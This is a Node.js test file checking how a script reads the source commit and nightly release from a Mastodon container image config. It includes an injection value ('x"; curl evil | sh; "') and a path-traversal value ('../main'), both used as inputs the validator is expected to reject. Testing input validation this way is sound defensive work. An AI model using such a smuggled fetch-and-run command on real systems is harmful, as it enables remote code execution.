import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { test } from 'node:test';

import { candidateFromImageConfig } from '../scripts/resolve_upstream.mjs';

test('reads the source commit and nightly release from a real image config', async () => {
  const evidence = JSON.parse(await readFile(new URL('./fixtures/nightly-image-config.json', import.meta.url), 'utf8'));
  assert.deepEqual(candidateFromImageConfig(evidence['linux/amd64'], 'sha256:abc'), {
    commit: 'a7cc70db674d79616597fcc1e67aafee6fcb2f11', release: 'nightly.2026-09-13', imageDigest: 'sha256:abc',
  });
});

test('falls back to the OCI revision label, but never guesses a commit', () => {
  const commit = '4a7ad772cc9a47264c6aea79b74b0778baf1dc0d';
  assert.equal(candidateFromImageConfig({ config: { Env: [], Labels: { 'org.opencontainers.image.revision': commit } } }, 'd').commit, commit);
  assert.throws(() => candidateFromImageConfig({ config: { Env: ['SOURCE_COMMIT='] } }, 'd'), /does not name a source commit/);
});

test('rejects a release name that is not a plain tag', () => {
  const commit = '4a7ad772cc9a47264c6aea79b74b0778baf1dc0d';
  const config = (release) => ({ config: { Env: [`SOURCE_COMMIT=${commit}`, `MASTODON_VERSION_PRERELEASE=${release}`] } });
  assert.equal(candidateFromImageConfig(config('nightly.2026-09-22'), 'd').release, 'nightly.2026-09-22');
  assert.throws(() => candidateFromImageConfig(config('x"; curl evil | sh; "'), 'd'), /unexpected release/);
  assert.throws(() => candidateFromImageConfig(config('../main'), 'd'), /unexpected release/);
});
